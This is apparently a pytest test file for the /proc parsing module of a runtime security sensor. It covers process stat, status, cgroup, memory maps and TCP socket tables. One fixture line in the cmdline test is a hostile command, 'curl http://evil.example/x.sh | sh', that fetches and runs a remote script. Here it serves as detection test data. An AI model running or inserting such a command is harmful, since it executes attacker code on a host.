from runtime_sensor import procfs


def test_list_pids(fake_proc):
    assert procfs.list_pids(fake_proc) == [1, 4242, 4243, 5001, 6001]


def test_parse_stat_handles_parens_in_comm(fake_proc):
    st = procfs.read_stat(6001, fake_proc)
    assert st.comm == "tricky) name"
    assert st.ppid == 1
    assert st.starttime == 8000


def test_parse_stat_garbage():
    assert procfs.parse_stat("") is None
    assert procfs.parse_stat("garbage") is None


def test_read_status(fake_proc):
    st = procfs.read_status(4243, fake_proc)
    assert (st.name, st.ppid, st.uid, st.euid, st.tgid) == ("sh", 4242, 33, 33, 4243)


def test_read_cmdline_and_exe(fake_proc):
    assert procfs.read_cmdline(4243, fake_proc) == ["/bin/sh", "-c", "curl http://evil.example/x.sh | sh"]
    assert procfs.read_exe(4242, fake_proc) == "/usr/sbin/nginx"
    assert procfs.read_exe(6001, fake_proc) == "/usr/bin/tricky"  # " (deleted)" stripped
    assert procfs.read_exe(99999, fake_proc) is None


def test_parse_cgroup_containerd_k8s(fake_proc):
    cid, pod_uid = procfs.read_cgroup(4242, fake_proc)
    assert cid == "a" * 64
    assert pod_uid == "1b2c3d4e-5f60-7182-93a4-b5c6d7e8f901"


def test_parse_cgroup_docker_v1(fake_proc):
    assert procfs.read_cgroup(5001, fake_proc) == ("b" * 64, None)


def test_parse_cgroup_host_process(fake_proc):
    assert procfs.read_cgroup(1, fake_proc) == (None, None)


def test_parse_cgroup_variants():
    cid = "c" * 64
    for line in (f"0::/system.slice/docker-{cid}.scope", f"0::/machine.slice/libpod-{cid}.scope",
                 f"0::/kubepods/besteffort/pod1234/crio-{cid}.scope"):
        assert procfs.parse_cgroup(line)[0] == cid


def test_parse_maps(fake_proc):
    paths = procfs.read_maps(5001, fake_proc)
    assert "/usr/lib/x86_64-linux-gnu/libssl.so.3" in paths
    assert "/opt/app/libcustom-2.4.1.so" in paths  # (deleted) suffix stripped
    assert not any(p.startswith("[") for p in paths)
    assert len(paths) == 7


def test_parse_net_tcp_ipv4(fake_proc):
    entries = procfs.parse_net_tcp(open(f"{fake_proc}/net/tcp").read())
    assert len(entries) == 5
    listen = entries[0]
    assert (listen.local_ip, listen.local_port, listen.state) == ("0.0.0.0", 80, "LISTEN")
    inbound = entries[1]
    assert (inbound.local_ip, inbound.local_port) == ("10.0.2.15", 80)
    assert (inbound.remote_ip, inbound.remote_port) == ("192.168.1.100", 54321)
    out = entries[2]
    assert (out.remote_ip, out.remote_port, out.uid, out.inode) == ("93.184.216.34", 443, 1000, 33333)
    assert entries[4].state == "SYN_SENT"


def test_parse_net_tcp6(fake_proc):
    entries = procfs.parse_net_tcp(open(f"{fake_proc}/net/tcp6").read())
    assert entries[0].local_ip == "::" and entries[0].state == "LISTEN"
    # IPv4-mapped addresses are reported as plain IPv4
    assert entries[1].local_ip == "10.0.2.15" and entries[1].remote_ip == "192.168.1.100"
    assert entries[2].local_ip == "2001:db8::1" and entries[2].remote_ip == "2001:db8::2"
    assert entries[2].remote_port == 80


def test_socket_inode_map(fake_proc):
    m = procfs.socket_inode_map(fake_proc)
    assert m[33333] == 5001 and m[22222] == 4242 and m[11111] == 1


def test_read_netns(fake_proc):
    assert procfs.read_netns(4242, fake_proc) == "net:[4026532001]"
